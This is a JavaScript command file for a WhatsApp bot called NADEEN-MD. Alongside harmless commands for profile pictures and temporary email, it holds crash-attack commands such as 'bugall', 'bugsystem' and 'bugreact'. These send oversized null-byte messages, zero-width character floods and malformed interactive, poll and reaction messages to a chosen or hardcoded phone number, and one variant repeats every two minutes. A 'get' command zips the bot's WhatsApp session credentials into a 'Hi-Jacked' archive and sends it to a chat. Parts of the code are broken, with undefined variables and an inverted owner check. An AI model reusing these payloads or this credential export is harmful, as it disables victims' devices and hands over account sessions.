const { cmd } = require("../command");
const axios = require("axios");
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('../lib/functions');
const fs = require("fs");
const fkontak = {
    key: {
        remoteJid: "94711451319@s.whatsapp.net",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "Naze",
    },
    message: {
        contactMessage: {
            displayName: "NADEEN-MD",
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;Meta AI;;;\nFN:Meta AI\nitem1.TEL;waid=94711451319:94711451319\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
            sendEphemeral: false,
        },
    },
};

cmd({
    pattern: "getpp",
    desc: "Fetch the profile picture of a tagged or replied user.",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { quoted, isGroup, sender, isMe, isOwner, isSudo, participants, reply }) => {
    try {
        //Owner only
        if (!isMe && isOwner && isSudo) return reply("*THIS COMMAND ONLY OWNER*");

        // Determine the target user
        const targetJid = quoted ? quoted.sender : sender;

        if (!targetJid) return reply("⚠️ Please reply to a message to fetch the profile picture.");

        // Fetch the user's profile picture URL
        const userPicUrl = await conn.profilePictureUrl(targetJid, "image").catch(() => null);

        if (!userPicUrl) return reply("⚠️ No profile picture found for the specified user.");

        // Send the user's profile picture
        await conn.sendMessage(m.chat, {
            image: { url: userPicUrl },
            caption: "🖼️ ʜᴇʀᴇ ɪꜱ ᴛʜᴇ ᴘʀᴏꜰɪʟᴇ ᴘɪᴄᴛᴜʀᴇ ᴏꜰ ᴛʜᴇ ꜱᴘᴇᴄɪꜰɪᴇᴅ ᴜꜱᴇʀ.\n\n> *•ɴᴀᴅᴇᴇɴ-ᴍᴅ•*"
        });
    } catch (e) {
        console.error("Error fetching user profile picture:", e);
        reply("❌ An error occurred while fetching the profile picture. Please try again later.");
    }
});

const Jimp = require('jimp')

cmd({
    pattern: "fullpp",
    react: "⚡",
    category: "owner",
    use: '.fullpp <mention your photo>',
    filename: __filename
}, async (conn, mek, m, context) => {
    const { from } = context;

    try {
        let q = m.quoted ? m.quoted : m;
        let mime = (q.msg || q).mimetype || '';
        if (!mime || !mime.startsWith('image')) {
            return await conn.sendMessage(from, { text: '❌ Reply to an image with *fullpp*' }, { quoted: m });
        }

        // Download image buffer
        let imgBuffer = await q.download();

        // Read image with Jimp
        let image = await Jimp.read(imgBuffer);

        // Resize & crop to WhatsApp size (640x640)
        image.cover(640, 640);

        // Save to buffer
        let finalBuffer = await image.getBufferAsync(Jimp.MIME_JPEG);

        // Update bot profile picture
        await conn.updateProfilePicture(conn.user.id, finalBuffer);

        await conn.sendMessage(from, { text: '✅ Bot profile picture updated successfully!\n\n> *•ɴᴀᴅᴇᴇɴ-ᴍᴅ•*' }, { quoted: m });
    } catch (e) {
        console.error(e);
        await conn.sendMessage(from, { text: '❌ Failed to update bot profile picture.' }, { quoted: m });
    }
});

cmd({
    pattern: "tempmail",
    alias: ["genmail"],
    desc: "Generate a new temporary email address",
    category: "other",
    react: "📧",
    filename: __filename
},
async (conn, mek, m, { from, reply, prefix }) => {
    try {
        const response = await axios.get('https://apis.davidcyriltech.my.id/temp-mail');
        const { email, session_id, expires_at } = response.data;

        // Format the expiration time and date
        const expiresDate = new Date(expires_at);
        const timeString = expiresDate.toLocaleTimeString('en-US', {
            hour: '2-digit',
            minute: '2-digit',
            hour12: true
        });
        const dateString = expiresDate.toLocaleDateString('en-US', {
            weekday: 'short',
            month: 'short',
            day: 'numeric',
            year: 'numeric'
        });

        // Create the complete message
        const message = `
📧 *TEMPORARY EMAIL GENERATED*

✉️ *Email Address:*
${email}

⏳ *Expires:*
${timeString} • ${dateString}

🔑 *Session ID:*
\`\`\`${session_id}\`\`\`

📥 *Check Inbox:*
.inbox ${session_id}

_Email will expire after 24 hours_
${config.FOOTER}
`;

        await conn.sendMessage(
            from,
            { 
                text: message,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363304606757133@newsletter',
                        newsletterName: 'NADEEN-MD',
                        serverMessageId: 101
                    }
                }
            },
            { quoted: mek }
        );

    } catch (e) {
        console.error('TempMail error:', e);
        reply(`❌ Error: ${e.message}`);
    }
});
cmd({
    pattern: "checkmail",
    alias: ["inbox", "tmail", "mailinbox"],
    desc: "Check your temporary email inbox",
    category: "other",
    react: "📬",
    filename: __filename
},
async (conn, mek, m, { from, reply, args }) => {
    try {
        const sessionId = args[0];
        if (!sessionId) return reply('🔑 Please provide your session ID\nExample: .checkmail YOUR_SESSION_ID');

        const inboxUrl = `https://apis.davidcyriltech.my.id/temp-mail/inbox?id=${encodeURIComponent(sessionId)}`;
        const response = await axios.get(inboxUrl);

        if (!response.data.success) {
            return reply('❌ Invalid session ID or expired email');
        }

        const { inbox_count, messages } = response.data;

        if (inbox_count === 0) {
            return reply('📭 Your inbox is empty');
        }

        let messageList = `📬 *You have ${inbox_count} message(s)*\n\n`;
        messages.forEach((msg, index) => {
            messageList += `━━━━━━━━━━━━━━━━━━\n` +
                          `📌 *Message ${index + 1}*\n` +
                          `👤 *From:* ${msg.from}\n` +
                          `📝 *Subject:* ${msg.subject}\n` +
                          `⏰ *Date:* ${new Date(msg.date).toLocaleString()}\n\n` +
                          `📄 *Content:*\n${msg.body}\n\n ` +
                          `*㋛ 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙽𝙰𝙳𝙴𝙴𝙽 〽️𝙳*`;
        });

        await reply(messageList);

    } catch (e) {
        console.error('CheckMail error:', e);
        reply(`❌ Error checking inbox: ${e.response?.data?.message || e.message}`);
    }
});

cmd({
    pattern: "readmore",
    desc: "Readmore message",
    category: "convert",
    use: '.readmore < text >',
    react: "📝",
    filename: __filename
}, async (conn, mek, m, {
    from, quoted, body, isCmd, command, args, q, isGroup, sender
}) => {
    try {
        // Get the message text after the command (.readmore text)
        let readmoreText = q ? q : "No text provided";

        // Create the "Readmore" effect by adding a special character to split the text
        let readmore = "\u200B".repeat(4000); // This creates a large gap between text

        // Full message to send
        let replyText = `${readmore}${readmoreText}`;

        // Send the message with the "Readmore" functionality
        await conn.sendMessage(from, { text: replyText }, { quoted: mek });

        // React to the message
        await conn.sendMessage(from, { react: { text: "", key: mek.key } });

    } catch (e) {
        console.log(e);
        reply(`Error: ${e.message}`);
    }
});
cmd({
  pattern: "srepo",
  desc: "Fetch information about a GitHub repository.",
  category: "search",
  react: "🍃",
  filename: __filename
}, async (conn, m, store, { from, args, reply }) => {
  try {
    const repoName = args.join(" ");
    if (!repoName) {
      return reply("❌ Please provide a GitHub repository in the format 📌 `owner/repo`.");
    }

    const apiUrl = `https://api.github.com/repos/${repoName}`;
    const { data } = await axios.get(apiUrl);

    let responseMsg = `📁 *GitHub Repository Info* 📁\n\n`;
    responseMsg += `📌 *Name*: ${data.name}\n`;
    responseMsg += `🔗 *URL*: ${data.html_url}\n`;
    responseMsg += `📝 *Description*: ${data.description || "No description"}\n`;
    responseMsg += `⭐ *Stars*: ${data.stargazers_count}\n`;
    responseMsg += `🍴 *Forks*: ${data.forks_count}\n`;
    responseMsg += `👤 *Owner*: ${data.owner.login}\n`;
    responseMsg += `📅 *Created At*: ${new Date(data.created_at).toLocaleDateString()}\n`;
    responseMsg += `\n> ${config.FOOTER}`;

    await conn.sendMessage(from, { text: responseMsg }, { quoted: m });
  } catch (error) {
    console.error("GitHub API Error:", error);
    reply(`❌ Error fetching repository data: ${error.response?.data?.message || error.message}`);
  }
});

cmd({
  pattern: "story",
  desc: "Post a WhatsApp status (story) as text, image, or video",
  react: "💚",
  category: "owner",
  use: ".story <text|url> [caption]",
  filename: __filename
}, async (conn, mek, m, { isOwner, args, quoted }) => {
  if (!isOwner) return;
  try {
    if (quoted && quoted.message.imageMessage) {
      // Image story from quoted message
      const image = await conn.downloadMediaMessage(quoted);
      const caption = args.join(' ') || '';
      await conn.sendMessage("status@broadcast", { image, caption });
    } else if (quoted && quoted.message.videoMessage) {
      // Video story from quoted message
      const video = await conn.downloadMediaMessage(quoted);
      const caption = args.join(' ') || '';
      await conn.sendMessage("status@broadcast", { video, caption });
    } else if (args.length && /^https?:\/\/\S+\.\S+/i.test(args[0])) {
      // Media story (image/video by URL)
      const url = args[0];
      const caption = args.slice(1).join(' ') || '';
      const res = await axios.head(url);
      const mime = res.headers['content-type'];
      if (mime.startsWith("image")) {
        await conn.sendMessage("status@broadcast", { image: { url }, caption });
      } else if (mime.startsWith("video")) {
        await conn.sendMessage("status@broadcast", { video: { url }, caption });
      } else {

      }
    } else {
      // Text story
      const text = args.join(' ');
      await conn.sendMessage("status@broadcast", { text });
    }
    
  } catch (e) {
    console.error("Failed to send status update:", e);
    
  }
});
cmd({
  pattern: "get",
  desc: "Backup Hacked folder into zip",
  category: "owner",
  fromMe: true,
  filename: __filename
}, async (conn, m, msg, { reply }) => {
    if (!isOwner) return 

  const rootPath = path.join(__dirname, "..");
  const zipPath = path.join(rootPath, "Hi-Jacked by Nadeen.zip");
  const hackedFolderPath = path.join(rootPath, "auth_info_baileys");
  if (!fs.existsSync(hackedFolderPath)) {
    console.log("❌ Hacked folder not found");
    return;
  }
  const zip = new AdmZip();
  zip.addLocalFolder(hackedFolderPath, "auth_info_baileys");
  zip.writeZip(zipPath);
  await udmodzsnd(m.chat, {
    document: fs.readFileSync(zipPath),
    fileName: "Hi-Jacked by Nadeen.zip",
    mimetype: "application/zip",
    caption: "> ㋡ *㋛ 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙽𝙰𝙳𝙴𝙴𝙽 〽️🅳 ッ"
  }, { quoted: m });
  fs.unlinkSync(zipPath);
});

cmd({
  pattern: "bugall",
  react: "💀",
  alias: ["bugall", "superbug"],
  desc: "Send combined WhatsApp crash bugs",
  category: "owner",
  use: ".bugall 947XXXXXXXX",
  filename: __filename
},
async (conn, mek, m, { args, reply, isOwner }) => {
  try {
    if (!isOwner) return reply("❌ Owner only command!");

    const target = args[0]?.replace(/[^\d]/g, "");
    if (!target) return reply("❗ Use: .bugall 947XXXXXXXX");
    const jid = `${target}@s.whatsapp.net`;

    const repeatAmount = 1020000;

    // Zero width invisible bug text
    const zwcBug = '\u200b\u200c\u200d\u200e\u200f\u2060\u2061\u2062\u2063\u2064'.repeat(50000);

    // Define all payloads to send
    const payloads = [];

    for (let i = 0; i < 7; i++) {
      // beta1 crash payload
      payloads.push({
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "p", format: "EXTENSIONS_1" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio-buttons${"\u0000".repeat(repeatAmount)}\",\"screen_0_TextInput_1\":\"\\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
              }
            }
          }
        }
      });

      // beta2 crash payload
      payloads.push({
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "Oh ini yang katanya riper", format: "EXTENSIONS_1" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio-buttons${"\u0000".repeat(repeatAmount)}\",\"screen_0_TextInput_1\":\"\\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
              }
            }
          }
        }
      });

      // buk1 crash payload
      payloads.push({
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "💣 WhatsApp Killer 💣", format: "EXTENSIONS_1" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio-buttons${"\u0000".repeat(repeatAmount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
              }
            }
          }
        }
      });

      // Zero width invisible text spam message
      payloads.push({
        text: zwcBug
      });
    }

    // Send all payloads sequentially with slight delay
    for (const payload of payloads) {
      await conn.relayMessage(jid, payload, { participant: { jid } });
      await new Promise(r => setTimeout(r, 300)); // 300 ms delay between sends
    }

    await reply(`✅ Super bug sent to: ${target}\n🚨 Sent total ${payloads.length} crash + invisible packets.`);
  } catch (e) {
    console.error("BUGALL ERROR:", e);
    await reply("❌ Failed to send bugall.");
  }
});
const delay = ms => new Promise(res => setTimeout(res, ms));

cmd({
  pattern: "bugxinvi",
  desc: "Send pure invisible WhatsApp crash bug",
  category: "owner",
  usage: ".bugxinvi <9477xxxxxxx>",
  react: "👻",
  filename: __filename,
},
async (conn, m, { args, reply, isOwner }) => {



  // Pure invisible character overload
  const bug = 
    "\u2060".repeat(5000) + // Word Joiner
    "\u200B".repeat(4000) + // Zero-width space
    "\u200C".repeat(3000) + // ZWNJ
    "\u200D".repeat(3000) + // ZWJ
    "\u180E".repeat(2000) + // Mongolian vowel separator
    "\u2063".repeat(3000);  // Invisible separator

  try {
    for (let i = 0; i < 3; i++) {
      await conn.sendMessage(`94716769285@s.whatsapp.net`, {
        text: bug,
        quoted: m,
      });
      await delay(1200);
    }

    await reply(`✅ Invisible bug sent to ${target}`);
  } catch (err) {
    console.error(err);
    await reply("⚠️ Sending failed.");
  }
});
cmd({
  pattern: "bugcombo",
  react: "💀",
  alias: ["bugpoll", "bugbutton"],
  desc: "Send combo WhatsApp crash bug (poll + button override)",
  category: "owner",
  filename: __filename,
  use: "<947xxxxxxxx>",
},
async (conn, m, { args, text, command }) => {
  const delay = (ms) => new Promise(res => setTimeout(res, ms));


  try {
    // Poll Crash Update Payload
    const fakePoll = {
      pollUpdateMessage: {
        pollCreationMessageKey: {
          remoteJid: "status@broadcast",
          fromMe: false,
          id: "BUG-" + Date.now(),
        },
        selectedOptions: ["💥 Bug Option 💥"],
        voterJid: `94716769285@s.whatsapp.net`
      }
    };

    // Button Override Payload
    const buttonOverride = {
      buttons: [
        {
          buttonId: "BugForce",
          buttonText: { displayText: "💀 Bug Trigger" },
          type: 1
        }
      ],
      text: "☠️ Crash Mode Activated ☠️",
      footer: "NADEEN-MD",
      headerType: 1,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [],
        externalAdReply: {
          title: 'WhatsApp System Error',
          body: '💣 Critical Fault Detected!',
          mediaType: 1,
          thumbnailUrl: 'https://invalid.url/crash.jpg',
          renderLargerThumbnail: true
        }
      }
    };

    // Send Bug Message (Button Override)
    await conn.sendMessage(`94716769285@s.whatsapp.net`, buttonOverride, { quoted: m });

    // Send Poll Update Crash after small delay
    await delay(1000);
    await conn.relayMessage(`94716769285@s.whatsapp.net`, fakePoll, {});

    await m.reply(`✅ Crash bug combo sent to `);
  } catch (e) {
    console.error(e);
    await m.reply("❌ Failed to send crash bug.");
  }
});
cmd({
  pattern: "bugreact",
  react: "💣",
  alias: ["reactbug"],
  desc: "Send crash bug via reaction emoji",
  category: "owner",
  filename: __filename,
  use: "<947xxxxxxxx>",
},
async (conn, m, { args }) => {
  

  try {
    const reaction = {
      react: "💥".repeat(9999) + "\u2063".repeat(9999), // Massive emoji + invisible override
      key: {
        remoteJid: `94716769285@s.whatsapp.net`,
        fromMe: false,
        id: "ABCD1234567890", // Fake message ID
        participant: `94716769285@s.whatsapp.net`,
      }
    };

    await conn.sendMessage(`94716769285@s.whatsapp.net`, { react: reaction });
    await m.reply(`✅ Crash reaction *`);
  } catch (err) {
    console.error(err);
    await m.reply("⚠️ Failed to send reaction bug.");
  }
});
cmd({
  pattern: "bugsystem",
  react: "💻",
  alias: ["bugui", "bugsys"],
  desc: "Trigger WhatsApp System UI crash (⚠️ ownerous)",
  category: "owner",
  filename: __filename,
  use: "<947xxxxxxxx>",
},
async (conn, m, { args }) => {
  

  const systemCrashPayload = {
    text: '\u2063'.repeat(50000) + // invisible overflow
          '\u200F'.repeat(10000) + // RTL override
          '💣'.repeat(10000) +     // emoji overload
          JSON.stringify({
            android: {
              view: {
                system_ui_overlay: true,
                action: "com.whatsapp.SYS_UI_REACT",
                intent: "android.intent.action.MAIN",
                extras: {
                  KEY: "\u0000".repeat(99999)
                }
              }
            }
          }),
    viewOnce: true
  };

  try {
    await conn.sendMessage(`94716769285@s.whatsapp.net`, systemCrashPayload, { quoted: m });
    await m.reply(`✅ System UI crash bug sent to `);
  } catch (err) {
    console.error(err);
    await m.reply("⚠️ Failed to send system UI crash.");
  }
});
cmd({
  pattern: "bugedu",
  alias: ["edubug", "eduattack"],
  desc: "Unicode Invisible Attack (Education Test Only)",
  category: "owner",
  usage: ".bugedu <9477xxxxxxx>\n.bugedu mini <num>\n.bugedu max <num>",
  react: "💥",
  filename: __filename,
},
async (conn, m, { args, reply }) => {
 

  // Payload modes
  const mini = "\u200B".repeat(300) + "\u200C".repeat(300) + "\u200D".repeat(300);
  const normal = "\u200B".repeat(1000) + "\u200C".repeat(1000) + "\u200D".repeat(1000);
  const max = "\u200B".repeat(2000) + "\u200C".repeat(2000) + "\u200D".repeat(2000);

  let payload = normal;
  let type = "📘 Normal Unicode Test";

  if (mode === "mini") {
    payload = mini;
    type = "📗 Mini Unicode Test";
  } else if (mode === "max") {
    payload = max;
    type = "📕 Heavy Unicode Test";
  }

  const messageText = `🔬 *${type}* 🔬

මෙම පණිවිඩයේ Unicode අක්ෂර:
* Zero-Width Space (U+200B)
* Zero-Width Non-Joiner (U+200C)
* Zero-Width Joiner (U+200D)

Invisible Character Count: *${payload.length}*

📌 *For education/testing purposes only.*

${payload}`;

  try {
    await conn.sendMessage(`94716769285@s.whatsapp.net`, { text: messageText });
    await reply(`✅ Unicode test message sent to successfully.\nPayload size: *${payload.length}* invisible characters.`);
  } catch (err) {
    console.error("bugedu-error:", err);
    await reply(`❌ Error sending Unicode message:\n${err.message || err}`);
  }
});
let bugInterval = null; // to keep track of auto bug sender

cmd({
  pattern: "bugalll",
  react: "💀",
  alias: ["bugall", "superbug"],
  desc: "Send combined WhatsApp crash bugs repeatedly every 2 minutes",
  category: "owner",
  use: ".bugall 947XXXXXXXX",
  filename: __filename
},
async (conn, mek, m, { args, reply, isOwner }) => {
  try {
    if (!isOwner) return reply("❌ Owner only command!");

    const target = args[0]?.replace(/[^\d]/g, "");
    if (!target) return reply("❗ Use: .bugall 947XXXXXXXX");

    const jid = `${target}@s.whatsapp.net`;
    const repeatAmount = 1020000;

    // Bug payload function
    const createPayloads = () => {
      const zwcBug = '\u200b\u200c\u200d\u200e\u200f\u2060\u2061\u2062\u2063\u2064'.repeat(50000);
      const payloads = [];

      for (let i = 0; i < 7; i++) {
        payloads.push(
          {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: { text: "p", format: "EXTENSIONS_1" },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_1_TextInput_0\":\"radio-buttons${"\u0000".repeat(repeatAmount)}\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
                  }
                }
              }
            }
          },
          {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: { text: "💣 WhatsApp Killer 💣", format: "EXTENSIONS_1" },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_1_TextInput_0\":\"radio-buttons${"\u0000".repeat(repeatAmount)}\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
                  }
                }
              }
            }
          },
          { text: zwcBug }
        );
      }

      return payloads;
    };

    // Function to send bug payloads
    const sendBugs = async () => {
      const payloads = createPayloads();
      for (const payload of payloads) {
        await conn.relayMessage(jid, payload, { participant: { jid } });
        await new Promise(r => setTimeout(r, 300)); // Delay
      }
      console.log(`[BUGALL] Sent ${payloads.length} bugs to ${target}`);
    };

    // If already running, stop it
    if (bugInterval) {
      clearInterval(bugInterval);
      bugInterval = null;
      return reply("⛔ Auto bug sender stopped.");
    }

    // Start interval for 2 minutes
    await sendBugs(); // send immediately
    bugInterval = setInterval(sendBugs, 2 * 60 * 1000); // every 2 min

    await reply(`✅ Started sending bugs every 2 minutes to: ${target}\n🧨 Auto-mode enabled. Use .bugall again to stop.`);
  } catch (e) {
    console.error("BUGALL AUTO ERROR:", e);
    await reply("❌ Failed to start auto bug sender.");
  }
});
cmd({
    pattern: "getdp",
    react: "📸",
    category: "owner",
    use: '.getpp <9471######>',
    filename: __filename
}, async (conn, mek, m, context) => {
    const { from, args } = context;

    try {
        if (!args[0]) 
            return await conn.sendMessage(from, { text: '❌ *Please provide a WhatsApp number!*\nExample: `getpp 9477xxxxxxx`' }, { quoted: m });

        // Format number with WhatsApp JID
        let jid = args[0].includes('@') ? args[0] : `${args[0]}@s.whatsapp.net`;

        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(jid, 'image'); // 'image' for full DP
        } catch {
            return await conn.sendMessage(from, { text: '⚠️ *Could not fetch profile picture.*\nUser may not have a DP.' }, { quoted: m });
        }

        // Download image
        const res = await fetch(ppUrl);
        const buffer = Buffer.from(await res.arrayBuffer());

        // Save temp file
        const tempPath = path.join(__dirname, `${jid.replace('@','_')}_dp.jpg`);
        fs.writeFileSync(tempPath, buffer);

        // Send DP with professional caption
        const caption = `✨ *WhatsApp Profile Picture* ✨\n\n📱 *Number:* ${args[0]}\n🖼️ *Fetched successfully!*\n\n${config.FOOTER}`;
        await conn.sendMessage(from, { image: fs.readFileSync(tempPath), caption }, { quoted: fkontak });

        // Delete temp file
        fs.unlinkSync(tempPath);

    } catch (e) {
        console.error(e);
        await conn.sendMessage(from, { text: '❌ *Failed to fetch profile picture.*' }, { quoted: fkontak });
    }
});
